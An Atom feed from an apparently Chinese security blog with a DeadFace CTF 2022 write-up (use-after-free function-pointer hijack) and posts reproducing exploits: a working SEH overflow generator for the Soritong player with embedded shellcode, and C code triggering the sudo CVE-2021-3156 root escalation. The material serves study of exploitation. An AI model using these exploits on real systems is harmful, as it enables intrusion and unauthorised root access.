<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>老叭美食家</title>
  
  <subtitle>永远热爱生活</subtitle>
  <link href="https://laobameishijia.github.io/atom.xml" rel="self"/>
  
  <link href="https://laobameishijia.github.io/"/>
  <updated>2022-10-23T06:50:14.676Z</updated>
  <id>https://laobameishijia.github.io/</id>
  
  <author>
    <name>老叭美食家</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Writeup for DeadFaceCTF2022</title>
    <link href="https://laobameishijia.github.io/2022/10/16/writeup-deadfacectf-2022/"/>
    <id>https://laobameishijia.github.io/2022/10/16/writeup-deadfacectf-2022/</id>
    <published>2022-10-16T09:25:00.000Z</published>
    <updated>2022-10-23T06:50:14.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><p>这次rev做出了两道题，没有什么困难的地方，通过反编译软件可以很清楚地看到源码。程序主题的逻辑也很清晰，主要是涉及了一些关于AES和异或的加密过程。</p><h2 id="deadface2022-re05"><a href="#deadface2022-re05" class="headerlink" title="deadface2022_re05"></a>deadface2022_re05</h2><p>这个主逻辑也很清楚 先要求你输入一个字符串，然后对这个字符串进行sha3哈希，然后判断这个hash字符串和程序中保存的正确的hash字符串一不一样。如果一样的话，他会通过这个字符串来解密(异或操作)加密的字符串，最后返回正确的flag。</p><p>解密的操作是通过hashcat来解密的，我看视频他用的是<code>3070ti</code>。当然还有一个字典，然后一下子就算出来了。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221019184046.png" alt="hash破解"></p><h2 id="re03-another-fine-product"><a href="#re03-another-fine-product" class="headerlink" title="re03-another-fine-product"></a>re03-another-fine-product</h2><p>这是一个软件，通过软件中的点击操作获取到相应的信息。</p><p><strong>此题和现实中的软件破解很类似，为了保护软件的收益，通常会采取用户验证的方式。而这部分验证的代码通常是非常复杂且不可见的。但是有些时候，我们可以修改程序流，使程序跳过验证的步骤，从而达到破解软件的效果。</strong></p><h3 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h3><p>软件本身没有什么问题，就是简单的一些菜单和点击之后出现的弹窗。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221023144355.png" alt="软件截图"></p><h3 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221023144745.png" alt="WindbgPreview"></p><h3 id="基础的知识"><a href="#基础的知识" class="headerlink" title="基础的知识"></a>基础的知识</h3><ul><li>user32.dll Windows用户界面相关应用程序接口 user32.dll是Windows用户界面相关应用程序接口，用于包括Windows处理，基本用户界面等特性，如创建窗口和发送消息。</li><li>ntdll.dll Windows NT内核级文件 ntdll.dll是重要的Windows NT内核级文件。描述了windows本地NTAPI的接口。当Windows启动时，ntdll.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。</li></ul><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>这个题是<code>jack</code>与我交流的时候讨论到的。里面有一个非常重要的点需要总结。</p><p>以前我认为<code>call function_name</code>的时候，<code>function_name</code>必须要位于整个函数最开始的地方。</p><p>但实际上，并不是如此。因为CPU也不知道你这个<code>function_name</code>到底是不是在整个函数最开始的地方。</p><h2 id="主体逻辑"><a href="#主体逻辑" class="headerlink" title="主体逻辑"></a>主体逻辑</h2><ol><li><p>首先程序是运行在服务器端利用tcp套接字来与客户端进行交互，无任何保护措施，提供了上图的6个功能。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016131314.png" alt="主题逻辑"></p></li><li><p><code>Make Target</code>功能，会通过用户的输入。利用malloc函数申请一个0x18的堆空间创建一个Target结构体。这个结构体的第二个成员是一个函数指针，指向一个删除结构体的函数。</p></li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016131713.png" alt="delete_structure"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016131744.png" alt="Target结构体"></p><ol start="3"><li><code>Create an Exploit</code>功能，会通过用户输入。利用malloc函数申请一个0x18的堆空间创建Exploit结构体。</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016131925.png" alt="Exploit结构体"></p><ol start="4"><li><code>retrieve_admin_key</code>，验证用户输入的密码，正确则返回flag。</li></ol><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">ssize_t retrieve_admin_key()&#123;  ssize_t result; &#x2F;&#x2F; eax  send(fork_sock, &quot;What is the password?\n&quot;, 0x17u, 0);  recv(fork_sock, &quot;aaaaaaaaaaaaaaaa&quot;, 0x10u, 0);  if ( !strcmp(&quot;ga*wi58Fw#o&amp;WOG9&quot;, &quot;aaaaaaaaaaaaaaaa&quot;) )    result &#x3D; send(fork_sock, &quot;flag&#123;--------------------------&#125;\n&quot;, 0x22u, 0);  else    result &#x3D; send(fork_sock, &quot;Bad Password\n&quot;, 0xEu, 0);  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h2><p>Target结构体和Exploit结构体都是申请的堆空间上大小为0x18的空间。而且程序在这个过程中没有申请过其他堆块。此外delete_struct的函数里面的只是简单调用了<code>free</code>函数。<code>free</code>函数会操作堆块的头部，而不会清除此前保留在堆块中的数据。指向堆块的指针实际上还是指向的这个已经被释放的堆块的用户可以用空间首地址。但是这个时候注意，由于堆块已经释放，此前用户可用地址的前8个字节已经变成了指向前一个可用堆块和后一个可用堆块的指针。</p><p>那么，我们通过创建一个Target然后再删除，然后创建一个<code>Exploit</code>结构体，这样的话，Exploit结构体申请到的堆空间与之前删除的Target结构体申请的堆空间是一致的。那么Delete_structure这个成员的内容就变成我们可以操控的了。接着就需要使用delete功能调用这个函数就行。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">switch ( buf ) &#123;   case 0:   case 49:     v5 &#x3D; newS1(v7);     break;   case 50:     if ( v5 ) &#x2F;&#x2F; v5在调用delete函数之后，实际上还是指向的已经被释放的堆空间的地址。     &#x2F;&#x2F;所以，我们再exploit中构造函数指针之后，依然是可以调用我们修改的函数指针。       (*(void (__cdecl **)(int, int *))(v5 + 16))(v5, v7);     else       send(*v7, &quot;No target?\n&quot;, 0xCu, 0);     break;   case 51:     v6 &#x3D; newS2(v7);     break;   case 52:     check_compatability(v5, v6, v7);     break;   case 53:     retrieve_admin_key();     break;   default:     return __readgsdword(0x14u) ^ v9; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016133405.png" alt="对比"></p><p>该程序没有开启任何的保护机制，所以我们接下来要考虑的就是应该修改或者跳转到哪里？</p><p>开始我一直以为，这个地址只能是函数的首地址。实际上通过我们最开始描述，这个地址不是首地址也可以。只不过可能后续程序就没办法正常运行了。</p><p>所以我们直接跳到了下图所示位置，注意这个时候要保证send函数参数的正确性。注意寄存器里面的值前后的变化。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016134322.png" alt="跳转位置"></p><p>实际上，这个跳转位置并不是check_compatability函数的开始部分。因为我们无法知道这个正确的密码，只能是跳过验证的部分。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016134429.png" alt="效果"></p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><p>Target结构体申请到的堆空间</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016134658.png" alt="Target结构体申请到的堆空间"></p><p>创建Target结构体之后堆空间的内容</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016141528.png" alt="创建Target结构体之后堆空间的内容"></p><p>删除掉我们申请的Target时<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016135032.png" alt="delete_structure"></p><p>删除掉Target之后，堆空间中的内容</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016141136.png" alt="删除Target之后的堆块"></p><p>创建Exploit结构体</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016141808.png" alt="创建Exploit结构体"></p><p>第二次，使用删除功能，可以发现之前指向堆空间的指针依然是指向的堆空间的用户可用地址。并没有被清零。实际只是堆块放到了空闲管理的堆块表里面去了。而且我们调用的call也只指向了retrieve_admin_key函数</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016141940.png" alt="第二次，使用删除功能"></p><p>当我们步入之后发现，call指令同样还是先把返回地址压栈，然后再将我们设置的指令地址弹出到eip中。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016142156.png" alt="第二次，使用删除功能"></p><p>之后我们就能显示出flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221016142446.png" alt="效果"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="linux-堆块结构体"><a href="#linux-堆块结构体" class="headerlink" title="linux 堆块结构体"></a>linux 堆块结构体</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">&#x2F;*  This struct declaration is misleading (but accurate and necessary).  It declares a &quot;view&quot; into memory allowing access to necessary  fields at known offsets from a given base. See explanation below.*&#x2F;struct malloc_chunk &#123;  INTERNAL_SIZE_T      prev_size;  &#x2F;* Size of previous chunk (if free).  *&#x2F;  INTERNAL_SIZE_T      size;       &#x2F;* Size in bytes, including overhead. *&#x2F;  struct malloc_chunk* fd;         &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk;  &#x2F;* Only used for large blocks: pointer to next larger size.  *&#x2F;  struct malloc_chunk* fd_nextsize; &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk_nextsize;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>prev_size, 如果该 chunk 的物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。</li><li>size ，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<br>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。<br>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。<br>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li><li>fd，bk。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<br>fd 指向下一个（非物理相邻）空闲的 chunk<br>bk 指向上一个（非物理相邻）空闲的 chunk<br>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li><li>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<br>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</li></ul><h3 id="CALL指令"><a href="#CALL指令" class="headerlink" title="CALL指令"></a>CALL指令</h3><p>CALL（LCALL）指令执行时，进行两步操作：<br>（1）将程序下一条指令的位置的IP压入堆栈中；<br>（2）转移到调用的子程序。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Rev&quot;&gt;&lt;a href=&quot;#Rev&quot; class=&quot;headerlink&quot; title=&quot;Rev&quot;&gt;&lt;/a&gt;Rev&lt;/h1&gt;&lt;p&gt;这次rev做出了两道题，没有什么困难的地方，通过反编译软件可以很清楚地看到源码。程序主题的逻辑也很清晰，主要是涉及了一些关于AES和</summary>
      
    
    
    
    <category term="CTF" scheme="https://laobameishijia.github.io/category/CTF/"/>
    
    
    <category term="比赛" scheme="https://laobameishijia.github.io/tag/%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>漏洞复现-栈溢出+堆溢出sudo提权</title>
    <link href="https://laobameishijia.github.io/2022/10/11/lou-dong-fu-xian-zhan-yi-chu-dui-yi-chu-sudo-ti-quan/"/>
    <id>https://laobameishijia.github.io/2022/10/11/lou-dong-fu-xian-zhan-yi-chu-dui-yi-chu-sudo-ti-quan/</id>
    <published>2022-10-11T09:25:00.000Z</published>
    <updated>2022-10-23T06:50:14.680Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞复现-栈溢出-堆溢出sudo提权"><a href="#漏洞复现-栈溢出-堆溢出sudo提权" class="headerlink" title="漏洞复现-栈溢出+堆溢出sudo提权"></a>漏洞复现-栈溢出+堆溢出sudo提权</h1><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>通过栈溢出的方式，将异常处理指针覆盖。从而控制程序执行流。</p><p>SEH是什么<br>SEH中文名结构异常化处理，是一种Windows机制，用于一致地处理硬件和软件异常。</p><p>在C#/java/C等语言中可以自定义处理异常，使用try/catch语句。C++也可以抛出异常，C#定义一个基类，所有的异常都继承这个基类。<br>操作系统为每个进程提供了一个异常处理机制，这个异常处理机制的地址、参数保存在栈中，这就是溢出的原因。SEH会动态发生改变。若程序里没有提供异常处理机制，则会将其交给操作系统处理。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011153031.png" alt="Windows SEH"></p><p>图中可以看到，SEH chain在堆栈上并非连续的，每一节由一个_EXCEPTION_REGISTRATION_RECORD处理函数组成，每个_EXCEPTION_REGISTRATION_RECORD处理函数具有两个指针，一个指向next SEH，即下一个SEH的地址；一个是当前SEH handler。</p><p>在这个单向链表中，头部位于FS:[0]段，保存了异常链的首地址。</p><p>在处理函数_except_handler中有四个参数，第一个参数是指向_EXCEPTION_RECORD结构的指针，该结构包含有关给定异常的信息，包括异常代码，异常地址和参数数量。_except_handler函数用这些信息和第三个参数ContextRecord的信息，来确定这个异常是否可以由当前处理器处理，_except_handler返回EXCEPTION_DISPOSITION，如果为ExceptionContinueExecution，表示该异常是否已经被成功处理，如果为ExceptionContinueSearch，表示当前异常处理器无法处理该异常，则根据nSEH指针中的地址找下一个处理器，重复以找到合适可以处理异常的处理器。<br>第二个参数在利用中很关键，它的值为nSEH。在堆栈上位于ESP+8的位置，这样我们就可以控制这第二个参数来进行跳转了。</p><p>尾部_EXCEPTION_REGISTRATION_RECORD处理函数的nSEH指针指向FFFFFFFF，标志着End of SEH chain。Windows在链的末尾放置一个默认（或者说通用的）异常处理程序，以帮助确保以某种方式处理异常。这时可能会弹框看到“ …遇到问题，需要关闭 ”</p><h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><ol><li>部署winxpSP3虚拟机镜像,安装soritong</li><li>利用kali生成一个包含模式字符串的ui.txt<br><code>usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000 &gt; ui.txt</code></li><li>将ui.txt复制到soritong目录下的\Skin\Default目录中</li><li>使用windbg调试soritong，加载进去之后，先选用debug菜单中的go handled exception, 紧接着选用go unhandled exception.</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154339.png" alt="windbg调试"></p><ol start="5"><li>可以看到eip被覆盖为了0x41367441, 也就是A6tA。然后我们利用kali查找A6tA在模式字符串中的位置，<br><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q At6A  </code></li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154410.png" alt="确定溢出位置"></p><p>发现其处于588的位置，由于当异常发生时，程序会跳转到SEH handler去执行，通过将这个handler的值设置为程序自带模块的一个pop/pop/ret地址，能够实现程序跳转到next seh pointer去，在next seh中需要做的就是跳转到shellcode执行。将next seh的值弹到了eip而已。shellcode的布局大致如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154457.png" alt="shellcode"></p><p>然后我们可以去找，程序中自带的pop+pop+ret的地址。在windbg中输入lm，可以找到程序会使用的模块。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154518.png" alt="lm"></p><ol start="6"><li>再利用windbug 命令 s +首地址+尾地址+5f 5e c3(pop/pop/ret的机器码)去寻找这些指令。最终在Play模块中成功找到。需要注意的是，这里面不是每一个模块都能用。需要尝试几次 <code>s 10000000 10094000 5f 5e c3</code></li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154600.png" alt="pop+pop+ret"></p><p>随机挑一个 0x10014499 作为填充seh的内容。这里再解释一下pop pop ret指令的作用，当异常发生的时候，异常分发器创建自己的栈帧，会将EH handler成员压入新创的栈帧中，在EH结构中有一个域是EstablisherFrame。这个域指向异常注册记录(next seh)的地址并被压入栈中，当一个函数被调用的时候被压入的这个值是位于ESP+8的地方。使用pop pop ret后，就会将next seh的地址放到EIP中。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20221011154640.png" alt="except_handler"></p><p>因为shellcode在运行的过程会操作栈空间，所以我们需要在栈空间中留出一小部分。在shellcode前后最好都要留出空位。这样执行成功率比较大。如果执行不成功，就尝试加大空位的大小。</p><p>最终的shellcode就是</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">junk:584字节 ‘A’next seh:”\xeb\x46\x90\x90” (jmp跳转指令)seh:”\x99\x44\x01\x10”junk2: ‘\x90’*64shellcode：弹个计算器.也可以在网上找 可以使用kali的msfvenom生成，但是有的不能运行。junk3 ‘\x90’*1000  必须要填充，否则没有办法执行呢！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个python需要用pyhon2.5生成！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"ui.txt"</span>data <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">584</span>nextseh <span class="token operator">=</span> <span class="token string">"\xeb\x46\x90\x90"</span>seh <span class="token operator">=</span> <span class="token string">"\x99\x44\x01\x10"</span>junk2<span class="token operator">=</span><span class="token string">"\x90"</span><span class="token operator">*</span><span class="token number">64</span>shellcode <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"</span><span class="token string">"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"</span><span class="token string">"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"</span><span class="token string">"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"</span><span class="token string">"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"</span><span class="token string">"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37"</span><span class="token string">"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48"</span><span class="token string">"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48"</span><span class="token string">"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c"</span><span class="token string">"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"</span><span class="token string">"\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48"</span><span class="token string">"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54"</span><span class="token string">"\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48"</span><span class="token string">"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43"</span><span class="token string">"\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57"</span><span class="token string">"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a"</span><span class="token string">"\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b"</span><span class="token string">"\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53"</span><span class="token string">"\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"</span><span class="token string">"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49"</span><span class="token string">"\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46"</span><span class="token string">"\x4e\x36\x43\x46\x42\x50\x5a"</span><span class="token punctuation">)</span>junk3 <span class="token operator">=</span> <span class="token string">"\x90"</span><span class="token operator">*</span><span class="token number">1000</span>data <span class="token operator">=</span> data <span class="token operator">+</span> nextseh <span class="token operator">+</span> seh <span class="token operator">+</span> junk2<span class="token operator">+</span> shellcode <span class="token operator">+</span> junk3f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/">http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/</a>  (讲windows seh的,写的非常详细)</li><li><a href="https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2014/04/07/seh-exploit">https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2014/04/07/seh-exploit</a> (讲如何溢出soritong.exe的)</li><li><a href="https://www.cnblogs.com/cjhk/p/11598690.html">https://www.cnblogs.com/cjhk/p/11598690.html</a> —–C语言中的转义字符</li><li><a href="http://c.biancheng.net/c/ascii/">http://c.biancheng.net/c/ascii/</a>  —–ascii</li><li><a href="https://pukrr.github.io/2020/05/05/%E5%88%A9%E7%94%A8SEH%E9%93%BE%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">https://pukrr.github.io/2020/05/05/%E5%88%A9%E7%94%A8SEH%E9%93%BE%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</a></li></ul><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>sudo是Linux中一个非常重要的管理权限的软件，它允许用户使用 root 权限来运行程序。而CVE-2021-3156是sudo中存在一个堆溢出漏洞。通过该漏洞，任何没有特权的用户均可使用默认的sudo配置获取root权限。</p><p>该漏洞可以影响从1.8.2~1.8.31p2下的所有旧版本sudo</p><p>在主要参考的资料中，已经对该漏洞的成因介绍的非常详细了。所以在这里只总结一些自认为比较细节的地方把。</p><h3 id="细节问题"><a href="#细节问题" class="headerlink" title="细节问题"></a>细节问题</h3><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include&lt;math.h&gt;#define __LC_CTYPE               0#define __LC_NUMERIC             1#define __LC_TIME                2#define __LC_COLLATE             3#define __LC_MONETARY            4#define __LC_MESSAGES            5#define __LC_ALL                 6#define __LC_PAPER               7#define __LC_NAME                8#define __LC_ADDRESS             9#define __LC_TELEPHONE          10#define __LC_MEASUREMENT        11#define __LC_IDENTIFICATION     12char * envName[13]&#x3D;&#123;&quot;LC_CTYPE&quot;,&quot;LC_NUMERIC&quot;,&quot;LC_TIME&quot;,&quot;LC_COLLATE&quot;,&quot;LC_MONETARY&quot;,&quot;LC_MESSAGES&quot;,&quot;LC_ALL&quot;,&quot;LC_PAPER&quot;,&quot;LC_NAME&quot;,&quot;LC_ADDRESS&quot;,&quot;LC_TELEPHONE&quot;,&quot;LC_MEASUREMENT&quot;,&quot;LC_IDENTIFICATION&quot;&#125;;int now&#x3D;13;int envnow&#x3D;0;int argvnow&#x3D;0;char * envp[0x300];char * argv[0x300];char * addChunk(int size)&#123;    now --;    char * result;    if(now &#x3D;&#x3D;6)    &#123;        now --;    &#125;    if(now&gt;&#x3D;0)    &#123;        result&#x3D;malloc(size+0x20);        strcpy(result,envName[now]);        strcat(result,&quot;&#x3D;C.UTF-8@&quot;);        for(int i&#x3D;9;i&lt;&#x3D;size-0x17;i++)            strcat(result,&quot;A&quot;);        envp[envnow++]&#x3D;result;    &#125;    return result;&#125;void final()&#123;    now --;    char * result;    if(now &#x3D;&#x3D;6)    &#123;        now --;    &#125;    if(now&gt;&#x3D;0)    &#123;        result&#x3D;malloc(0x100);        strcpy(result,envName[now]);        strcat(result,&quot;&#x3D;xxxxxxxxxxxxxxxxxxxxx&quot;);        envp[envnow++]&#x3D;result;    &#125;&#125;int setargv(int size,int offset)&#123;    size-&#x3D;0x10;    signed int x,y;    signed int a&#x3D;-3;    signed int b&#x3D;2*size-3;    signed int c&#x3D;2*size-2-offset*2;    signed int tmp&#x3D;b*b-4*a*c;    if(tmp&lt;0)        return -1;    tmp&#x3D;(signed int)sqrt((double)tmp*1.0);    signed int A&#x3D;(0-b+tmp)&#x2F;(2*a);    signed int B&#x3D;(0-b-tmp)&#x2F;(2*a);    if(A&lt;0 &amp;&amp; B&lt;0)        return -1;    if((A&gt;0 &amp;&amp; B&lt;0) || (A&lt;0 &amp;&amp; B&gt;0))        x&#x3D;(A&gt;0) ? A: B;    if(A&gt;0 &amp;&amp; B &gt; 0)        x&#x3D;(A&lt;B) ? A : B;    y&#x3D;size-1-x*2;    int len&#x3D;x+y+(x+y+y+1)*x&#x2F;2;    while ((signed int)(offset-len)&lt;2)    &#123;        x--;        y&#x3D;size-1-x*2;        len&#x3D;x+y+(x+y+1)*x&#x2F;2;        if(x&lt;0)            return -1;    &#125;    int envoff&#x3D;offset-len-2+0x30;    printf(&quot;%d,%d,%d\n&quot;,x,y,len);    char * Astring&#x3D;malloc(size);    int i&#x3D;0;    for(i&#x3D;0;i&lt;y;i++)        Astring[i]&#x3D;&#39;A&#39;;    Astring[i]&#x3D;&#39;\x00&#39;;    argv[argvnow++]&#x3D;&quot;sudoedit&quot;;    argv[argvnow++]&#x3D;&quot;-s&quot;;    for (i&#x3D;0;i&lt;x;i++)        argv[argvnow++]&#x3D;&quot;\\&quot;;    argv[argvnow++]&#x3D;Astring;    argv[argvnow++]&#x3D;&quot;\\&quot;;    argv[argvnow++]&#x3D;NULL;    for(i&#x3D;0;i&lt;envoff;i++)        envp[envnow++]&#x3D;&quot;\\&quot;;    envp[envnow++]&#x3D;&quot;X&#x2F;test&quot;;    return 0;&#125;int main()&#123;    setargv(0xa0,0x650);    addChunk(0x40);    addChunk(0x40);    addChunk(0xa0);    addChunk(0x40);    final();    execve(&quot;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;sudoedit&quot;,argv,envp);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><